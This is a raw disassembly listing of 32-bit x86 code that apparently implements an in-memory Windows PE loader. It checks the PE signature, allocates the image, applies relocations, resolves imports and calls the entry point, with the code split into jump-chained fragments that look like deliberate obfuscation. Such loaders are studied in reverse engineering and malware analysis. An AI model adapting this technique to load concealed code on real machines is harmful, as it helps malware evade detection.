  401ecb:	89 44 24 08          	mov    %eax,0x8(%esp)
  401ecf:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401ed6:	00 
  401ed7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401eda:	89 04 24             	mov    %eax,(%esp)
  401edd:	e8 96 10 00 00       	call   0x402f78
  401ee2:	e9 6a 06 00 00       	jmp    0x402551
  401ee7:	e9 66 fc ff ff       	jmp    0x401b52
  401eec:	01 c2                	add    %eax,%edx
  401eee:	b8 00 00 00 00       	mov    $0x0,%eax
  401ef3:	83 c0 18             	add    $0x18,%eax
  401ef6:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401ef9:	e9 d7 00 00 00       	jmp    0x401fd5
  401efe:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401f01:	e9 a3 06 00 00       	jmp    0x4025a9
  401f06:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401f09:	8b 00                	mov    (%eax),%eax
  401f0b:	85 c0                	test   %eax,%eax
  401f0d:	0f 89 fe 00 00 00    	jns    0x402011
  401f13:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401f16:	e9 3d fe ff ff       	jmp    0x401d58
  401f1b:	83 ec 0c             	sub    $0xc,%esp
  401f1e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f21:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  401f25:	0f 84 b5 04 00 00    	je     0x4023e0
  401f2b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401f2e:	c7 40 10 01 00 00 00 	movl   $0x1,0x10(%eax)
  401f35:	e9 ab fc ff ff       	jmp    0x401be5
  401f3a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f3d:	8b 40 14             	mov    0x14(%eax),%eax
  401f40:	e9 b8 05 00 00       	jmp    0x4024fd
  401f45:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401f48:	01 c9                	add    %ecx,%ecx
  401f4a:	8d 14 11             	lea    (%ecx,%edx,1),%edx
  401f4d:	01 d2                	add    %edx,%edx
  401f4f:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401f52:	e9 f0 01 00 00       	jmp    0x402147
  401f57:	e9 b0 fc ff ff       	jmp    0x401c0c
  401f5c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f5f:	0f b7 00             	movzwl (%eax),%eax
  401f62:	e9 d0 02 00 00       	jmp    0x402237
  401f67:	8b 00                	mov    (%eax),%eax
  401f69:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401f6c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401f6f:	e9 63 f8 ff ff       	jmp    0x4017d7
  401f74:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401f77:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f7a:	8b 40 0c             	mov    0xc(%eax),%eax
  401f7d:	e9 19 05 00 00       	jmp    0x40249b
  401f82:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f85:	8b 40 24             	mov    0x24(%eax),%eax
  401f88:	e9 29 ff ff ff       	jmp    0x401eb6
  401f8d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401f90:	8b 00                	mov    (%eax),%eax
  401f92:	85 c0                	test   %eax,%eax
  401f94:	0f 85 bf fe ff ff    	jne    0x401e59
  401f9a:	e9 ae fe ff ff       	jmp    0x401e4d
  401f9f:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401fa2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401fa5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401fa8:	8b 40 04             	mov    0x4(%eax),%eax
  401fab:	e9 b6 fb ff ff       	jmp    0x401b66
  401fb0:	8b 40 3c             	mov    0x3c(%eax),%eax
  401fb3:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401fb6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401fb9:	e9 2c fd ff ff       	jmp    0x401cea
  401fbe:	85 c0                	test   %eax,%eax
  401fc0:	0f 84 7d f8 ff ff    	je     0x401843
  401fc6:	b8 01 00 00 00       	mov    $0x1,%eax
  401fcb:	e9 78 f8 ff ff       	jmp    0x401848
  401fd0:	e9 6e f8 ff ff       	jmp    0x401843
  401fd5:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401fd8:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  401fdf:	e9 62 fa ff ff       	jmp    0x401a46
  401fe4:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  401feb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401fee:	8b 40 50             	mov    0x50(%eax),%eax
  401ff1:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  401ff8:	00 
  401ff9:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402000:	00 
  402001:	89 44 24 04          	mov    %eax,0x4(%esp)
  402005:	e9 5b 02 00 00       	jmp    0x402265
  40200a:	89 02                	mov    %eax,(%edx)
  40200c:	e9 7c ff ff ff       	jmp    0x401f8d
  402011:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402014:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402017:	8b 00                	mov    (%eax),%eax
  402019:	e9 2b f9 ff ff       	jmp    0x401949
  40201e:	03 45 ec             	add    -0x14(%ebp),%eax
  402021:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  402028:	00 
  402029:	e9 eb f7 ff ff       	jmp    0x401819
  40202e:	c3                   	ret
  40202f:	55                   	push   %ebp
  402030:	89 e5                	mov    %esp,%ebp
  402032:	83 ec 38             	sub    $0x38,%esp
  402035:	8b 45 10             	mov    0x10(%ebp),%eax
  402038:	8b 40 04             	mov    0x4(%eax),%eax
  40203b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40203e:	e9 24 04 00 00       	jmp    0x402467
  402043:	8b 40 08             	mov    0x8(%eax),%eax
  402046:	e9 d8 fc ff ff       	jmp    0x401d23
  40204b:	e8 c8 0f 00 00       	call   0x403018
  402050:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  402054:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40205b:	00 
  40205c:	89 04 24             	mov    %eax,(%esp)
  40205f:	e8 94 0f 00 00       	call   0x402ff8
  402064:	eb 29                	jmp    0x40208f
  402066:	89 e5                	mov    %esp,%ebp
  402068:	83 ec 38             	sub    $0x38,%esp
  40206b:	8b 45 08             	mov    0x8(%ebp),%eax
  40206e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402071:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402074:	0f b7 00             	movzwl (%eax),%eax
  402077:	e9 3d f8 ff ff       	jmp    0x4018b9
  40207c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40207f:	8b 40 34             	mov    0x34(%eax),%eax
  402082:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  402089:	00 
  40208a:	e9 db fb ff ff       	jmp    0x401c6a
  40208f:	83 ec 0c             	sub    $0xc,%esp
  402092:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402095:	e9 4f f9 ff ff       	jmp    0x4019e9
  40209a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40209e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4020a1:	89 04 24             	mov    %eax,(%esp)
  4020a4:	e8 df 0e 00 00       	call   0x402f88
  4020a9:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4020ac:	e9 27 fd ff ff       	jmp    0x401dd8
  4020b1:	0f b7 c0             	movzwl %ax,%eax
  4020b4:	25 ff 0f 00 00       	and    $0xfff,%eax
  4020b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020bf:	85 c0                	test   %eax,%eax
  4020c1:	0f 84 bd f7 ff ff    	je     0x401884
  4020c7:	83 f8 03             	cmp    $0x3,%eax
  4020ca:	0f 85 d9 fb ff ff    	jne    0x401ca9
  4020d0:	e9 ff f7 ff ff       	jmp    0x4018d4
  4020d5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020d8:	8b 40 08             	mov    0x8(%eax),%eax
  4020db:	e9 8e f6 ff ff       	jmp    0x40176e
  4020e0:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  4020e7:	00 
  4020e8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  4020ef:	00 
  4020f0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020f4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4020f7:	89 04 24             	mov    %eax,(%esp)
  4020fa:	e8 01 0f 00 00       	call   0x403000
  4020ff:	e9 bc 03 00 00       	jmp    0x4024c0
  402104:	e8 07 0f 00 00       	call   0x403010
  402109:	83 ec 0c             	sub    $0xc,%esp
  40210c:	e9 b7 fc ff ff       	jmp    0x401dc8
  402111:	8b 40 28             	mov    0x28(%eax),%eax
  402114:	8d 04 02             	lea    (%edx,%eax,1),%eax
  402117:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40211a:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40211e:	e9 02 03 00 00       	jmp    0x402425
  402123:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402126:	8b 40 0c             	mov    0xc(%eax),%eax
  402129:	e9 f0 fe ff ff       	jmp    0x40201e
  40212e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402131:	8b 40 04             	mov    0x4(%eax),%eax
  402134:	85 c0                	test   %eax,%eax
  402136:	0f 84 d3 fc ff ff    	je     0x401e0f
  40213c:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40213f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402142:	e9 20 fe ff ff       	jmp    0x401f67
  402147:	8b 04 85 40 40 40 00 	mov    0x404040(,%eax,4),%eax
  40214e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402151:	e9 c6 fa ff ff       	jmp    0x401c1c
  402156:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402159:	0f b7 00             	movzwl (%eax),%eax
  40215c:	66 3b 45 d6          	cmp    -0x2a(%ebp),%ax
  402160:	0f 85 d1 fa ff ff    	jne    0x401c37
  402166:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402169:	e9 1c f8 ff ff       	jmp    0x40198a
  40216e:	e9 9c fc ff ff       	jmp    0x401e0f
  402173:	8b 45 08             	mov    0x8(%ebp),%eax
  402176:	e9 50 02 00 00       	jmp    0x4023cb
  40217b:	8b 00                	mov    (%eax),%eax
  40217d:	8b 40 28             	mov    0x28(%eax),%eax
  402180:	e9 1a fe ff ff       	jmp    0x401f9f
  402185:	e8 76 0e 00 00       	call   0x403000
  40218a:	83 ec 10             	sub    $0x10,%esp
  40218d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402190:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402194:	0f 85 c4 fc ff ff    	jne    0x401e5e
  40219a:	b8 00 00 00 00       	mov    $0x0,%eax
  40219f:	e9 65 01 00 00       	jmp    0x402309
  4021a4:	e9 b5 fc ff ff       	jmp    0x401e5e
  4021a9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4021ac:	8b 40 04             	mov    0x4(%eax),%eax
  4021af:	01 45 e8             	add    %eax,-0x18(%ebp)
  4021b2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4021b5:	8b 00                	mov    (%eax),%eax
  4021b7:	e9 cc f9 ff ff       	jmp    0x401b88
  4021bc:	89 54 24 04          	mov    %edx,0x4(%esp)
  4021c0:	89 04 24             	mov    %eax,(%esp)
  4021c3:	e8 18 0e 00 00       	call   0x402fe0
  4021c8:	83 ec 10             	sub    $0x10,%esp
  4021cb:	85 c0                	test   %eax,%eax
  4021cd:	e9 eb f5 ff ff       	jmp    0x4017bd
  4021d2:	0f 84 70 fc ff ff    	je     0x401e48
  4021d8:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4021df:	e9 30 f6 ff ff       	jmp    0x401814
  4021e4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4021e7:	e9 8d 01 00 00       	jmp    0x402379
  4021ec:	0f 85 cb f5 ff ff    	jne    0x4017bd
  4021f2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4021f5:	e9 a8 fb ff ff       	jmp    0x401da2
  4021fa:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4021fd:	8b 40 18             	mov    0x18(%eax),%eax
  402200:	e9 11 fb ff ff       	jmp    0x401d16
  402205:	03 45 dc             	add    -0x24(%ebp),%eax
  402208:	8b 00                	mov    (%eax),%eax
  40220a:	8d 04 02             	lea    (%edx,%eax,1),%eax
  40220d:	c9                   	leave
  40220e:	c3                   	ret
  40220f:	55                   	push   %ebp
  402210:	89 e5                	mov    %esp,%ebp
  402212:	e9 8b 00 00 00       	jmp    0x4022a2
  402217:	80 7d d5 00          	cmpb   $0x0,-0x2b(%ebp)
  40221b:	0f 84 35 ff ff ff    	je     0x402156
  402221:	e9 16 fa ff ff       	jmp    0x401c3c
  402226:	90                   	nop
  402227:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40222a:	89 04 24             	mov    %eax,(%esp)
  40222d:	e8 dd ff ff ff       	call   0x40220f
  402232:	e9 cd 00 00 00       	jmp    0x402304
  402237:	0f b7 c0             	movzwl %ax,%eax
  40223a:	c1 f8 0c             	sar    $0xc,%eax
  40223d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402240:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402243:	0f b7 00             	movzwl (%eax),%eax
  402246:	e9 66 fe ff ff       	jmp    0x4020b1
  40224b:	0f 95 c0             	setne  %al
  40224e:	0f b6 c0             	movzbl %al,%eax
  402251:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402254:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402257:	8b 40 24             	mov    0x24(%eax),%eax
  40225a:	c1 e8 1f             	shr    $0x1f,%eax
  40225d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402260:	e9 1d fd ff ff       	jmp    0x401f82
  402265:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402268:	89 04 24             	mov    %eax,(%esp)
  40226b:	e8 90 0d 00 00       	call   0x403000
  402270:	83 ec 10             	sub    $0x10,%esp
  402273:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402276:	8b 40 54             	mov    0x54(%eax),%eax
  402279:	e9 62 fe ff ff       	jmp    0x4020e0
  40227e:	e8 95 0d 00 00       	call   0x403018
  402283:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402286:	89 54 24 08          	mov    %edx,0x8(%esp)
  40228a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402291:	00 
  402292:	89 04 24             	mov    %eax,(%esp)
  402295:	e8 86 0d 00 00       	call   0x403020
  40229a:	83 ec 0c             	sub    $0xc,%esp
  40229d:	e9 2e 03 00 00       	jmp    0x4025d0
  4022a2:	53                   	push   %ebx
  4022a3:	83 ec 24             	sub    $0x24,%esp
  4022a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4022ac:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  4022b0:	74 eb                	je     0x40229d
  4022b2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4022b5:	e9 fb 02 00 00       	jmp    0x4025b5
  4022ba:	89 44 24 04          	mov    %eax,0x4(%esp)
  4022be:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4022c5:	e9 bb fe ff ff       	jmp    0x402185
  4022ca:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4022cd:	89 50 04             	mov    %edx,0x4(%eax)
  4022d0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022d3:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  4022da:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022dd:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4022e4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022e7:	e9 f8 fc ff ff       	jmp    0x401fe4
  4022ec:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4022ef:	8b 40 50             	mov    0x50(%eax),%eax
  4022f2:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  4022f9:	00 
  4022fa:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  402301:	00 
  402302:	eb b6                	jmp    0x4022ba
  402304:	b8 00 00 00 00       	mov    $0x0,%eax
  402309:	c9                   	leave
  40230a:	e9 8c f5 ff ff       	jmp    0x40189b
  40230f:	8b 40 04             	mov    0x4(%eax),%eax
  402312:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402315:	c7 45 e0 ff ff ff ff 	movl   $0xffffffff,-0x20(%ebp)
  40231c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40231f:	8b 00                	mov    (%eax),%eax
  402321:	83 c0 78             	add    $0x78,%eax
  402324:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402327:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40232a:	eb 1c                	jmp    0x402348
  40232c:	ff d0                	call   *%eax
  40232e:	83 ec 0c             	sub    $0xc,%esp
  402331:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402334:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  40233b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40233e:	8b 40 08             	mov    0x8(%eax),%eax
  402341:	85 c0                	test   %eax,%eax
  402343:	e9 8a fe ff ff       	jmp    0x4021d2
  402348:	8b 40 04             	mov    0x4(%eax),%eax
  40234b:	85 c0                	test   %eax,%eax
  40234d:	e9 32 f4 ff ff       	jmp    0x401784
  402352:	0f b7 c0             	movzwl %ax,%eax
  402355:	01 c2                	add    %eax,%edx
  402357:	b8 00 00 00 00       	mov    $0x0,%eax
  40235c:	83 c0 18             	add    $0x18,%eax
  40235f:	8d 04 02             	lea    (%edx,%eax,1),%eax
  402362:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402365:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40236c:	e9 87 f8 ff ff       	jmp    0x401bf8
  402371:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402374:	e9 8d f9 ff ff       	jmp    0x401d06
  402379:	8b 40 08             	mov    0x8(%eax),%eax
  40237c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40237f:	c1 e2 02             	shl    $0x2,%edx
  402382:	01 d0                	add    %edx,%eax
  402384:	8b 00                	mov    (%eax),%eax
  402386:	83 f8 ff             	cmp    $0xffffffff,%eax
  402389:	0f 84 81 f4 ff ff    	je     0x401810
  40238f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402392:	e9 ac fc ff ff       	jmp    0x402043
  402397:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  40239b:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  40239f:	83 45 ec 02          	addl   $0x2,-0x14(%ebp)
  4023a3:	e9 fc f8 ff ff       	jmp    0x401ca4
  4023a8:	85 c0                	test   %eax,%eax
  4023aa:	e9 2b f9 ff ff       	jmp    0x401cda
  4023af:	c6 45 d5 00          	movb   $0x0,-0x2b(%ebp)
  4023b3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4023b6:	83 e8 01             	sub    $0x1,%eax
  4023b9:	66 89 45 d6          	mov    %ax,-0x2a(%ebp)
  4023bd:	8b 45 08             	mov    0x8(%ebp),%eax
  4023c0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4023c3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023c6:	e9 44 ff ff ff       	jmp    0x40230f
  4023cb:	8b 40 0c             	mov    0xc(%eax),%eax
  4023ce:	83 c0 01             	add    $0x1,%eax
  4023d1:	c1 e0 02             	shl    $0x2,%eax
  4023d4:	89 c3                	mov    %eax,%ebx
  4023d6:	e9 70 fc ff ff       	jmp    0x40204b
  4023db:	e9 47 fe ff ff       	jmp    0x402227
  4023e0:	e9 41 fe ff ff       	jmp    0x402226
  4023e5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4023e8:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4023ec:	0f 85 6c fa ff ff    	jne    0x401e5e
  4023f2:	e9 f5 fe ff ff       	jmp    0x4022ec
  4023f7:	89 04 24             	mov    %eax,(%esp)
  4023fa:	e8 01 fa ff ff       	call   0x401e00
  4023ff:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402402:	89 04 24             	mov    %eax,(%esp)
  402405:	e8 3e 01 00 00       	call   0x402548
  40240a:	85 c0                	test   %eax,%eax
  40240c:	0f 94 c0             	sete   %al
  40240f:	e9 00 f3 ff ff       	jmp    0x401714
  402414:	8b 55 d8             	mov    -0x28(%ebp),%edx
  402417:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40241a:	8b 40 10             	mov    0x10(%eax),%eax
  40241d:	8d 04 02             	lea    (%edx,%eax,1),%eax
  402420:	e9 d9 fa ff ff       	jmp    0x401efe
  402425:	0f 84 c8 f7 ff ff    	je     0x401bf3
  40242b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40242e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402435:	00 
  402436:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40243d:	00 
  40243e:	89 04 24             	mov    %eax,(%esp)
  402441:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402444:	ff d0                	call   *%eax
  402446:	e9 d0 fa ff ff       	jmp    0x401f1b
  40244b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40244e:	8b 40 14             	mov    0x14(%eax),%eax
  402451:	39 c2                	cmp    %eax,%edx
  402453:	76 0a                	jbe    0x40245f
  402455:	b8 00 00 00 00       	mov    $0x0,%eax
  40245a:	e9 ae fd ff ff       	jmp    0x40220d
  40245f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402462:	e9 16 01 00 00       	jmp    0x40257d
  402467:	8b 45 10             	mov    0x10(%ebp),%eax
  40246a:	8b 00                	mov    (%eax),%eax
  40246c:	89 c2                	mov    %eax,%edx
  40246e:	8b 45 10             	mov    0x10(%ebp),%eax
  402471:	8b 00                	mov    (%eax),%eax
  402473:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  402477:	e9 d6 fe ff ff       	jmp    0x402352
  40247c:	83 c0 02             	add    $0x2,%eax
  40247f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402483:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402486:	89 04 24             	mov    %eax,(%esp)
  402489:	e8 4a 0b 00 00       	call   0x402fd8
  40248e:	83 ec 08             	sub    $0x8,%esp
  402491:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402494:	89 02                	mov    %eax,(%edx)
  402496:	e9 f2 fa ff ff       	jmp    0x401f8d
  40249b:	8d 04 02             	lea    (%edx,%eax,1),%eax
  40249e:	89 04 24             	mov    %eax,(%esp)
  4024a1:	e8 42 0b 00 00       	call   0x402fe8
  4024a6:	e9 ce f8 ff ff       	jmp    0x401d79
  4024ab:	8b 00                	mov    (%eax),%eax
  4024ad:	05 a0 00 00 00       	add    $0xa0,%eax
  4024b2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4024b5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024b8:	8b 40 04             	mov    0x4(%eax),%eax
  4024bb:	e9 57 f9 ff ff       	jmp    0x401e17
  4024c0:	83 ec 10             	sub    $0x10,%esp
  4024c3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4024c6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4024c9:	8b 40 3c             	mov    0x3c(%eax),%eax
  4024cc:	e9 4e f4 ff ff       	jmp    0x40191f
  4024d1:	0f 85 9d fa ff ff    	jne    0x401f74
  4024d7:	e9 33 f9 ff ff       	jmp    0x401e0f
  4024dc:	e9 2d f9 ff ff       	jmp    0x401e0e
  4024e1:	3d 50 45 00 00       	cmp    $0x4550,%eax
  4024e6:	74 0a                	je     0x4024f2
  4024e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4024ed:	e9 17 fe ff ff       	jmp    0x402309
  4024f2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4024f5:	8b 50 50             	mov    0x50(%eax),%edx
  4024f8:	e9 7f fb ff ff       	jmp    0x40207c
  4024fd:	85 c0                	test   %eax,%eax
  4024ff:	75 0a                	jne    0x40250b
  402501:	b8 00 00 00 00       	mov    $0x0,%eax
  402506:	e9 02 fd ff ff       	jmp    0x40220d
  40250b:	e9 ed f2 ff ff       	jmp    0x4017fd
  402510:	8b 45 08             	mov    0x8(%ebp),%eax
  402513:	89 50 0c             	mov    %edx,0xc(%eax)
  402516:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402519:	8b 00                	mov    (%eax),%eax
  40251b:	e9 01 f5 ff ff       	jmp    0x401a21
  402520:	84 c0                	test   %al,%al
  402522:	0f 85 d5 f6 ff ff    	jne    0x401bfd
  402528:	c9                   	leave
  402529:	c3                   	ret
  40252a:	55                   	push   %ebp
  40252b:	89 e5                	mov    %esp,%ebp
  40252d:	83 ec 48             	sub    $0x48,%esp
  402530:	e9 a5 f5 ff ff       	jmp    0x401ada
  402535:	90                   	nop
  402536:	e9 a0 fe ff ff       	jmp    0x4023db
  40253b:	0f 95 c0             	setne  %al
  40253e:	84 c0                	test   %al,%al
  402540:	0f 85 4f f2 ff ff    	jne    0x401795
  402546:	c9                   	leave
  402547:	c3                   	ret
  402548:	55                   	push   %ebp
  402549:	89 e5                	mov    %esp,%ebp
  40254b:	e9 97 f3 ff ff       	jmp    0x4018e7
  402550:	90                   	nop
  402551:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  402555:	83 45 f4 28          	addl   $0x28,-0xc(%ebp)
  402559:	e9 74 f4 ff ff       	jmp    0x4019d2
  40255e:	03 45 e4             	add    -0x1c(%ebp),%eax
  402561:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402564:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402568:	0f 84 91 fe ff ff    	je     0x4023ff
  40256e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402571:	89 44 24 04          	mov    %eax,0x4(%esp)
  402575:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402578:	e9 7a fe ff ff       	jmp    0x4023f7
  40257d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402580:	8b 48 1c             	mov    0x1c(%eax),%ecx
  402583:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402586:	c1 e0 02             	shl    $0x2,%eax
  402589:	8d 04 01             	lea    (%ecx,%eax,1),%eax
  40258c:	e9 74 fc ff ff       	jmp    0x402205
  402591:	89 04 24             	mov    %eax,(%esp)
  402594:	e8 87 0a 00 00       	call   0x403020
  402599:	83 ec 0c             	sub    $0xc,%esp
  40259c:	e9 86 f8 ff ff       	jmp    0x401e27
  4025a1:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  4025a5:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4025a9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4025ac:	8b 00                	mov    (%eax),%eax
  4025ae:	85 c0                	test   %eax,%eax
  4025b0:	e9 31 f5 ff ff       	jmp    0x401ae6
  4025b5:	8b 40 10             	mov    0x10(%eax),%eax
  4025b8:	85 c0                	test   %eax,%eax
  4025ba:	0f 84 7b fd ff ff    	je     0x40233b
  4025c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025c3:	8b 40 04             	mov    0x4(%eax),%eax
  4025c6:	89 c2                	mov    %eax,%edx
  4025c8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025cb:	e9 ab fb ff ff       	jmp    0x40217b
  4025d0:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4025d3:	c9                   	leave
  4025d4:	c3                   	ret
  4025d5:	90                   	nop
  4025d6:	90                   	nop
  4025d7:	90                   	nop
	...
  4025e0:	55                   	push   %ebp
  4025e1:	31 c0                	xor    %eax,%eax
  4025e3:	89 e5                	mov    %esp,%ebp
  4025e5:	5d                   	pop    %ebp
  4025e6:	c3                   	ret
  4025e7:	89 f6                	mov    %esi,%esi
  4025e9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4025f0:	55                   	push   %ebp
  4025f1:	89 e5                	mov    %esp,%ebp
  4025f3:	83 ec 18             	sub    $0x18,%esp
  4025f6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4025f9:	85 c0                	test   %eax,%eax
  4025fb:	74 13                	je     0x402610
  4025fd:	83 f8 03             	cmp    $0x3,%eax
  402600:	74 0e                	je     0x402610
  402602:	b8 01 00 00 00       	mov    $0x1,%eax
  402607:	c9                   	leave
  402608:	c2 0c 00             	ret    $0xc
  40260b:	90                   	nop
  40260c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402610:	8b 55 10             	mov    0x10(%ebp),%edx
  402613:	89 44 24 04          	mov    %eax,0x4(%esp)
  402617:	8b 45 08             	mov    0x8(%ebp),%eax
  40261a:	89 54 24 08          	mov    %edx,0x8(%esp)
  40261e:	89 04 24             	mov    %eax,(%esp)
  402621:	e8 8a 07 00 00       	call   0x402db0
  402626:	b8 01 00 00 00       	mov    $0x1,%eax
  40262b:	c9                   	leave
  40262c:	c2 0c 00             	ret    $0xc
  40262f:	90                   	nop
  402630:	55                   	push   %ebp
  402631:	89 e5                	mov    %esp,%ebp
